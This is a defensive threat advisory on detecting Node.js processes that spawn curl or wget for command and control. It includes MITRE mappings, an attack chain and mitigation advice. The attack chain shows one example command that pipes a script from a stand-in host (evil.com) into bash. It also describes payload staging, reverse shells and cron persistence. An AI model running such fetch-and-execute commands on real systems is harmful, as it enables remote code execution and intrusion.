---
title: Node.js Spawning Curl or Wget for Command and Control
slug: 2024-01-nodejs-curl-wget
description: Detection of Node.js directly or via a shell spawning curl or wget, potentially indicating command and control behavior where adversaries download tools or payloads onto the system.
date: "2024-01-30T10:00:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - command_and_control
  - nodejs
  - curl
  - wget
  - initial_access
vendors:
  - Node.js
products:
  - Node.js
mitre_ttps:
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1071
    technique_name: Application Layer Protocol
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1105
    technique_name: Ingress Tool Transfer
references:
  - https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/command_and_control_curl_wget_spawn_via_nodejs_parent.toml
  - https://attack.mitre.org/techniques/T1071/
  - https://attack.mitre.org/techniques/T1071/001/
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/tactics/TA0011/
rules:
  - title: Node.js Spawning Shell with Curl/Wget Command
    description: Detects when Node.js spawns a shell (e.g., bash, cmd.exe) and executes curl or wget commands, potentially indicating command and control activity.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
    techniques:
      - T1071.001
      - T1105
    data_sources:
      - process_creation
      - windows
  - title: Node.js Directly Spawning Curl/Wget
    description: Detects when Node.js directly spawns curl or wget processes, potentially indicating command and control activity.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
    techniques:
      - T1071.001
      - T1105
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

This threat brief focuses on the detection of malicious activity where Node.js, a widely used JavaScript runtime environment, is leveraged to execute command-line tools like curl and wget. This activity can occur either directly or indirectly through a shell. Attackers may exploit Node.js applications to download and execute malicious payloads, effectively using the compromised application as a conduit for command and control (C2) operations. This behavior is particularly concerning because it can be masked under the guise of legitimate application activity, making it harder to detect. Defenders should be aware of Node.js processes spawning child processes, specifically curl or wget, and investigate further.

## Attack Chain

1. An attacker gains initial access to a system either via exploiting a vulnerable Node.js application or compromising a server running Node.js.
2. The attacker leverages the `child_process` module in Node.js to execute system commands.
3. The attacker uses `child_process.exec`, `child_process.spawn`, or `child_process.execFile` to call a shell.
4. Within the shell, the attacker executes `curl` or `wget` to download a malicious payload from a remote server. The attacker may use flags such as `-sL` or `--insecure` to bypass security measures.
5. The downloaded payload is saved to a temporary directory like `/tmp`, `/var/tmp`, or `/dev/shm`.
6. The attacker may then execute the downloaded payload using a shell interpreter (e.g., `bash`, `sh`) by piping the output of `curl` or `wget` directly into the interpreter (e.g., `curl http://evil.com/payload.sh | bash`).
7. The executed payload establishes a reverse shell or performs other malicious activities, such as data exfiltration or lateral movement.
8. The attacker maintains persistence by creating cron jobs or systemd services that execute the malicious payload periodically.

## Impact

Successful exploitation can lead to complete system compromise, data theft, and the establishment of a persistent foothold within the network. This can result in significant financial losses, reputational damage, and disruption of critical business operations. The use of Node.js makes detection difficult because it blends malicious activity with legitimate application behavior. The impact scales with the permissions of the account running the Node.js process.

## Recommendation

*   Implement the provided Sigma rule to detect when Node.js spawns `curl` or `wget` processes and tune it for your environment.
*   Monitor process creation events and network connections originating from Node.js processes to identify suspicious behavior.
*   Enforce strict egress filtering to prevent Node.js applications from communicating with unauthorized external endpoints.
*   Regularly audit Node.js application dependencies for known vulnerabilities and ensure timely patching.
*   Use application sandboxing and privilege separation to limit the impact of potential compromises.
*   Implement integrity monitoring to detect unauthorized modifications to files and configurations.
